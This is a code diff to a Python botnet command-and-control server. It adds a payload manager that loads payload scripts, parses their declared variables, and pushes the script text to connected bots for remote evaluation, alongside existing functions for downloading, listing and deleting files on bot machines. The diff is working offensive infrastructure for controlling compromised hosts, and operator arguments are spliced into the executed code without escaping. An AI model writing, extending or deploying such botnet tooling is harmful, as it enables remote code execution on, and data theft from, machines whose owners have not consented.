@@ -8,6 +8,7 @@ import select
 import base64
 import uuid
 import os
+import sys
 
 try:
     from server import formatsock, server
@@ -30,7 +31,6 @@ class BotNet(Thread):
     FILECLOSE_JSON = 'fileclose'
     LS_JSON = 'ls'
     FILESIZE_JSON = 'filesize'
-    PAYLOAD_EXT = '.py'
 
     def __init__(self, socketio, payloadpath="payloads", downloadpath="media/downloads"):
         super().__init__()
@@ -39,9 +39,7 @@ class BotNet(Thread):
         self.allConnections = {}
         self.socketio = socketio
         self.filemanager = BotNetFileManager(downloadpath)
-        self.payloadpath = payloadpath
-        self.payloadfiles = []
-        self.payloaddescriptions = {}
+        self.payloadmanager = BotNetPayloadManager(payloadpath)
         self.downloaddir = downloadpath
 
     def addConnection(self, user, conn):
@@ -178,37 +176,25 @@ class BotNet(Thread):
                                {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
             return False
 
-    def getPayloads(self):
-        self.genPayloads()
-        return self.payloadfiles
-
-    def getPayloadDescriptions(self):
-        self.genPayloads()
-        return self.payloaddescriptions
-
-    def genPayloads(self):
-        if len(self.payloadfiles)==0:
-            for root, dirs, files in os.walk(self.payloadpath):
-                for file in files:
-                    if file.endswith(BotNet.PAYLOAD_EXT):
-                        self.payloadfiles.append(os.path.join(root,file)[len(self.payloadpath)+1:-len(BotNet.PAYLOAD_EXT)])
-
-
-    def sendPayload(self, user, payload):
-        with self.connlock:
-            if user not in self.allConnections:
-                return False
-        payloadfile = os.path.join(self.payloadpath,payload+BotNet.PAYLOAD_EXT)
-        with open(payloadfile,"r") as f:
-            payloadtext = f.read()
-            return self.sendEval(user,payloadtext)
-
     def startFileDownload(self, user, filename):
         with self.connlock:
             if user in self.allConnections:
                 self.allConnections[user].startFileDownload(filename)
                 return True
             return None
+
+    def getPayloadNames(self):
+        return self.payloadmanager.getPayloadNames()
+
+    def getPayloads(self):
+        return self.payloadmanager.getPayloads()
+
+    def sendPayload(self, user, payload, args):
+        payloadtext = self.payloadmanager.getPayloadText(payload, args)
+        if payloadtext:
+            return self.sendEval(user, payloadtext)
+        else:
+            return False
 
     def requestLs(self, user, filename):
         with self.connlock:
@@ -226,7 +212,6 @@ class BotNet(Thread):
 
     def deleteFile(self, user, filename):
         return self.filemanager.deleteFile(user,filename)
-
 
 
 class BotServer(Thread):
@@ -256,7 +241,6 @@ class BotServer(Thread):
                 print("[+] Received connection from {}".format(user))
                 self.botnet.addConnection(user, bot)
                 self.socketio.emit('connection', {'user': user}, namespace='/bot')
-
 
 class Bot:
     FILE_SHARD_SIZE = 4096
@@ -336,7 +320,6 @@ class Bot:
         with self.botlock:
             json_str = json.dumps({Bot.LS_JSON: filename})
             self.sock.send(json_str)
-
 
 class BotNetFileManager:
     FILENAME_OBJFILE = 'filenames.json'
@@ -427,3 +410,65 @@ class BotNetFileManager:
                 return True
             return False
 
+class BotNetPayloadManager:
+    PAYLOAD_EXT = '.py'
+    COMMENT_DELIMIT = ['"""',"'''"]
+    VAR_DENOTE = 'VAR'
+
+    def __init__(self, payloadpath):
+        self.payloaddescriptions = {}
+        self.payloadfiles = {}
+        self.payloadpath = payloadpath
+        for root, dirs, files in os.walk(self.payloadpath):
+            for file in files:
+                if file.endswith(BotNetPayloadManager.PAYLOAD_EXT):
+                    filepath = os.path.join(root, file)
+                    name, desc = self.parsePayload(filepath)
+                    self.payloaddescriptions[name] = desc
+                    self.payloadfiles[name] = filepath
+
+    def getPayloads(self):
+        return self.payloaddescriptions
+
+    def getPayloadNames(self):
+        return [payload for payload in self.payloaddescriptions.keys()]
+
+    def parsePayload(self,payloadpath):
+        with open(payloadpath,"r") as f:
+            payloadlines = f.readlines()
+        payloaddict = dict(name=payloadpath[len(self.payloadpath)+1:-len(BotNetPayloadManager.PAYLOAD_EXT)],
+                           description='',
+                           vars={})
+        try:
+            if payloadlines[0].strip() in BotNetPayloadManager.COMMENT_DELIMIT:
+                for i in range(1,len(payloadlines)):
+                    payloadline = payloadlines[i]
+
+                    if payloadline in BotNetPayloadManager.COMMENT_DELIMIT:
+                        break
+                    elif ':' in payloadline:
+                        indx = payloadline.index(':')
+                        lhs, rhs = payloadline[:indx].strip(), payloadline[indx+1:].strip()
+                        if lhs.startswith(BotNetPayloadManager.VAR_DENOTE):
+                            var = lhs[len(BotNetPayloadManager.VAR_DENOTE):].strip()
+                            payloaddict['vars'][var] = rhs
+                        else:
+                            payloaddict[lhs.lower()] = rhs
+        except Exception as e:
+            sys.stderr.write("[!] Error parsing {}: {}\n".format(payloadpath,str(e)))
+            sys.stderr.flush()
+        return payloaddict['name'], payloaddict
+
+    def getPayloadText(self, payload, args):
+        if payload not in self.payloaddescriptions:
+            return None
+        vars = self.payloaddescriptions[payload]['vars']
+        vartext = ""
+        for reqvar in vars.keys():
+            if reqvar in args:
+                vartext += '{}="{}"\n'.format(reqvar,args[reqvar])
+            else:
+                return None
+        with open(self.payloadfiles[payload],"r") as f:
+            payloadtext = f.read()
+            return vartext+payloadtext
